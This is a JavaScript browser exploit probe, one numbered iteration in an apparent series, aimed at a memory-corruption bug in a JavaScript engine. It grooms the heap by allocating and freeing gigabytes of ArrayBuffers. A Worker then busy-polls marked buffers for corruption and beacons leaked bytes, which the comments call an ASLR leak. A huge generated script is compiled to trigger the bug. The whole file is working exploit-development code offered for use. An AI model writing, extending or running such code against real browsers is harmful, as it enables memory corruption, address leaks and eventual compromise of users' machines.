// p397 - PRE-MAP: allocate and free 1GB+ to map virtual pages before sweep
//
// V393-V396 DEAD: sweep hits unmapped pages and crashes.
// P142 COMPILED-OK: sweep survived because heap was pre-warmed (lots of mapped pages).
// Current probes have fresh heap (~50MB mapped). Need ~1GB+ mapped.
//
// Strategy: allocate 10,000 ArrayBuffers of 100,112 bytes (1GB+) in batches,
// free each batch. MADV_FREE preserves virtual mappings. MetadataTable goes
// into a freed slot. Sweep writes forward through mapped pages.
//
// Probes: main thread allocated ABs, transferred to Worker for tight poll.
//
// Beacon prefix: V397-

(function() {
  var BQ = 0;
  function B(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', '/beacon/V397-' + tag + '?t=' + Date.now() + '&q=' + (BQ++), false);
      x.send('');
    } catch(e) {}
  }

  B('BOOT');

  var AB_SIZE = 100112;

  // Phase 1: PRE-MAP 4GB+ of virtual address space
  // Allocate in batches of 200 (20MB), free each batch. MADV_FREE keeps mappings.
  // Physical RAM used: only ~20MB at a time. Virtual pages: cumulative.
  // V398 showed 1.2GB HELD limit. Cycling uses much less physical RAM.
  // 200 batches = 40,000 ABs = ~4GB of virtual mappings
  var BATCH = 200;
  var NBATCH = 200;
  var totalMapped = 0;

  for (var bn = 0; bn < NBATCH; bn++) {
    var batch = [];
    try {
      for (var i = 0; i < BATCH; i++) {
        batch.push(new ArrayBuffer(AB_SIZE));
      }
      totalMapped += BATCH * AB_SIZE;
      // Free this batch -- pages stay mapped via MADV_FREE
      for (var i = 0; i < BATCH; i++) batch[i] = null;
      batch = null;
    } catch(e) {
      // OOM on this batch -- free what we got and continue
      for (var i = 0; i < batch.length; i++) batch[i] = null;
      batch = null;
      B('PREMAP-OOM-BATCH' + bn);
      break;
    }
    // Report every 50 batches (~1GB)
    if ((bn + 1) % 50 === 0) {
      B('PREMAP-' + Math.round(totalMapped / 1048576) + 'MB-BATCH' + (bn + 1));
    }
  }
  B('PREMAP-TOTAL-' + Math.round(totalMapped / 1048576) + 'MB');

  // Phase 2: Allocate probes on main thread (same marge pages)
  var NPROBE = 10;
  var probeABs = [];
  for (var i = 0; i < NPROBE; i++) {
    var ab = new ArrayBuffer(AB_SIZE);
    var v = new Uint8Array(ab);
    for (var j = 0; j < AB_SIZE; j++) v[j] = 0x42;
    probeABs.push(ab);
  }
  B('PROBES-' + NPROBE);

  // Phase 3: Worker for tight polling
  var workerCode = function() {
    var abViews = [];
    var baseUrl = '';
    var AB_SIZE = 100112;

    function beacon(tag) {
      try {
        var x = new XMLHttpRequest();
        x.open('POST', baseUrl + '/beacon/V397-W-' + tag + '?t=' + Date.now(), false);
        x.send('');
      } catch(e) {}
    }
    function hexByte(v) { return (v < 16 ? '0' : '') + v.toString(16); }

    self.onmessage = function(e) {
      if (e.data.cmd === 'init') { baseUrl = e.data.baseUrl; beacon('ALIVE'); return; }

      if (e.data.cmd === 'probes') {
        var abs = e.data.buffers;
        for (var i = 0; i < abs.length; i++) {
          abViews.push(new Uint8Array(abs[i]));
        }
        beacon('GOT-' + abViews.length);

        var ok = 0;
        for (var i = 0; i < abViews.length; i++) {
          if (abViews[i][0] === 0x42 && abViews[i][24] === 0x42 && abViews[i][68] === 0x42) ok++;
        }
        beacon('VERIFY-' + ok + '-OK');

        self.postMessage({ ready: true });

        // TIGHT BUSY LOOP -- no iteration limit (runs until process dies or corruption found)
        beacon('TIGHTLOOP-START');
        var iter = 0;
        var hitCount = 0;

        while (true) {
          iter++;
          for (var pi = 0; pi < abViews.length; pi++) {
            var v = abViews[pi];
            if (v[0] !== 0x42 || v[24] !== 0x42 || v[64] !== 0x42 || v[68] !== 0x42 ||
                v[112] !== 0x42 || v[136] !== 0x42) {
              hitCount++;
              if (hitCount <= 15) {
                beacon('HIT-I' + iter + '-A' + pi);
                // Entry 0: link info (0-11)
                var h0 = '';
                for (var b = 0; b < 12; b++) h0 += hexByte(v[b]);
                beacon('A' + pi + '-E0LINK-' + h0);
                // Entry 0: thunk (24-31) = ASLR LEAK
                var h24 = '';
                for (var b = 24; b < 32; b++) h24 += hexByte(v[b]);
                beacon('A' + pi + '-E0THUNK-' + h24);
                // Entry 0: bits+idx (64-71)
                var h64 = '';
                for (var b = 64; b < 72; b++) h64 += hexByte(v[b]);
                beacon('A' + pi + '-E0BITS-' + h64);
                // Entry 1: thunk (136-143)
                var h136 = '';
                for (var b = 136; b < 144; b++) h136 += hexByte(v[b]);
                beacon('A' + pi + '-E1THUNK-' + h136);
                // Count non-0x42 in first 500 bytes
                var nonB = 0;
                for (var j = 0; j < 500; j++) {
                  if (v[j] !== 0x42) nonB++;
                }
                beacon('A' + pi + '-NON42-' + nonB);
              }
            }
          }
          if (iter % 500000 === 0) {
            beacon('POLL-' + (iter / 1000000) + 'M-H' + hitCount);
          }
        }
      }
    };
  };

  var workerBlob = new Blob(['(' + workerCode.toString() + ')()'], { type: 'application/javascript' });
  var worker = new Worker(URL.createObjectURL(workerBlob));
  worker.postMessage({ cmd: 'init', baseUrl: location.protocol + '//' + location.host });

  var transferList = probeABs.slice();
  worker.postMessage({ cmd: 'probes', buffers: probeABs }, transferList);
  probeABs = null;
  B('TRANSFERRED');

  worker.onmessage = function(e) {
    if (e.data.ready) {
      B('WORKER-READY');
      // GC to collect freed pre-map buffers
      var gcR = 0;
      function gc() {
        for (var j = 0; j < 2000; j++) new ArrayBuffer(8192);
        gcR++;
        if (gcR < 50) setTimeout(gc, 20);
        else { B('GC-' + gcR); build(); }
      }
      gc();
    }
  };

  function build() {
    B('BUILD');
    var N = 38348816;
    var CHUNK = 4000000;
    var nC = Math.floor(N / CHUNK);
    var rem = N - nC * CHUNK;
    var cc = 'a();'.repeat(CHUNK);
    var p = [
      '(function(a){if(window.____x397){',
    ];
    for (var c = 0; c < nC; c++) p.push(cc);
    p.push('a();'.repeat(rem));
    p.push('}})(function(){});window.__p397ok=true;');
    cc = null;
    var blob = new Blob(p, {type: 'application/javascript'});
    B('BLOB-' + Math.round(blob.size / 1048576) + 'MB');
    p = null;
    var url = URL.createObjectURL(blob);
    var sc = document.createElement('script');
    sc.onload = function() {
      B('COMPILED-' + (window.__p397ok ? 'OK' : 'FAIL'));
      // If we get here, sweep survived!
      // Give Worker a few seconds to scan, then beacon final status
      setTimeout(function() {
        B('SWEEP-SURVIVED');
      }, 3000);
    };
    sc.onerror = function() { B('SCRIPT-ERR'); };
    document.head.appendChild(sc);
    sc.src = url;
  }
})();
